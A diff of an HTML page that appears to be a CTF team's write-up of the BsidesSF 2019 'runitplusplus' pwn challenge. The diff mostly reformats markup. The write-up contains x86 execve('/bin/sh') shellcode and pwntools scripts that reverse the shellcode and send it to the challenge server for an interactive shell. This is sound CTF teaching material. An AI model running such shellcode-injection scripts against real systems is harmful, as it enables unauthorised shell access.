@@ -16,25 +16,18 @@
   <meta http-equiv="window-target" content="_top">
   
   <title>[Pwn] BsidesSF 2019 - runitplusplus | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="runitplusplus 52   Description:This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353    r">
+  <meta name="description" content="runitplusplus 52   Description: This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353 run">
 <meta name="keywords" content="bsidesSF,pwn,shellcode">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] BsidesSF 2019 - runitplusplus">
 <meta property="og:url" content="https://teamrocketist.github.io/2019/03/06/Pwn-BsidesSF-2019-runitplusplus/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="runitplusplus 52   Description:This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353    r">
+<meta property="og:description" content="runitplusplus 52   Description: This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353 run">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.imgur.com/k5s3dlN.png">
-<meta property="og:image" content="https://i.imgur.com/SGGg6NQ.png">
-<meta property="og:image" content="https://i.imgur.com/5m53dsK.png">
-<meta property="og:image" content="https://i.imgur.com/yZo3OQb.png">
-<meta property="og:image" content="https://i.imgur.com/DYWwyyW.png">
-<meta property="og:image" content="https://i.imgur.com/snueZSE.png">
 <meta property="og:updated_time" content="2019-03-06T07:16:45.126Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] BsidesSF 2019 - runitplusplus">
-<meta name="twitter:description" content="runitplusplus 52   Description:This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353    r">
-<meta name="twitter:image" content="https://i.imgur.com/k5s3dlN.png">
+<meta name="twitter:description" content="runitplusplus 52   Description: This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353 run">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
@@ -374,7 +367,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 587 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 623 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 4 (min)</span>
@@ -388,24 +381,37 @@
 <p>runitplusplus 52</p>
 </blockquote>
 <blockquote>
-<p><strong>Description</strong>:<br>This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt</p>
-<p>Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353</p>
-<p>   runitplusplus</p>
+<p><strong>Description</strong>:<br>
+This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt</p>
+<p>Location - <a href="http://runitplusplus-a36bf652.challenges.bsidessf.net:5353" target="_blank" rel="noopener">runitplusplus-a36bf652.challenges.bsidessf.net:5353</a></p>
+<p>runitplusplus</p>
 </blockquote>
 <p>As the description says this is the same as the <strong>runit</strong> challenge but with a bit of reversing:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/k5s3dlN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/k5s3dlN.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/k5s3dlN.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/k5s3dlN.png)
+</a>
 <p>The shell code I used for this was <strong>\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80</strong>, if we use this <a href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener">website</a> to check what this shellcode does:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/SGGg6NQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/SGGg6NQ.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/SGGg6NQ.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/SGGg6NQ.png)
+</a>
 <p>Everything looks right we are clearing <strong>EAX</strong> and <strong>EDX</strong> in the beginning, we are pushing the <strong>bin/sh</strong> string into the stack and put its address <strong>ECX</strong> the <strong>EDX</strong> must be zero because it’s the <strong>envp</strong> argument and <strong>EAX</strong> is 0xb which is the <strong>execve</strong> system call number, so now we just need to reverse this shell code, we can use python to do that in my case I used <strong>[::-1]</strong> which reverses the string:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'runitplusplus-a36bf652.challenges.bsidessf.net'</span></span><br><span class="line">port = <span class="number">5353</span></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line">filename = <span class="string">'runitplusplus'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'</span>[::<span class="number">-1</span>]</span><br><span class="line">r = getConn()</span><br><span class="line">gdb.attach(r, <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048680</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(SHELLCODE)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>So lets put a break point right on the address <strong>0x8048680</strong> which is right before the program does <strong>CALL EAX</strong> and do a step in and lets what what happened to the shell code after running that for loop:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/5m53dsK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5m53dsK.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/5m53dsK.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/5m53dsK.png)
+</a>
 <p>So to circumvent this what I did is to repeat the first 4 bytes of my shell code which was the code for <strong>xor eax,eax</strong> and <strong>xor edx,edx</strong>:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/yZo3OQb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yZo3OQb.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/yZo3OQb.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/yZo3OQb.png)
+</a>
 <p>So we need to add this to our original shell code and we get this <strong>\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80</strong> which in assembly is:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/DYWwyyW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/DYWwyyW.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/DYWwyyW.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/DYWwyyW.png)
+</a>
 <p>So lets check how it looks in gdb with the breakpoint:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/snueZSE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/snueZSE.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/snueZSE.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/snueZSE.png)
+</a>
 <p>Now that everything is fine we are ready to run the script on the server:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'runitplusplus-a36bf652.challenges.bsidessf.net'</span></span><br><span class="line">port = <span class="number">5353</span></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line">filename = <span class="string">'runitplusplus'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'</span>[::<span class="number">-1</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#gdb.attach(r, '''</span></span><br><span class="line"><span class="comment">#    b *0x8048680</span></span><br><span class="line"><span class="comment">#    c</span></span><br><span class="line"><span class="comment">#    ''')</span></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(SHELLCODE)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>Now running it:</p>
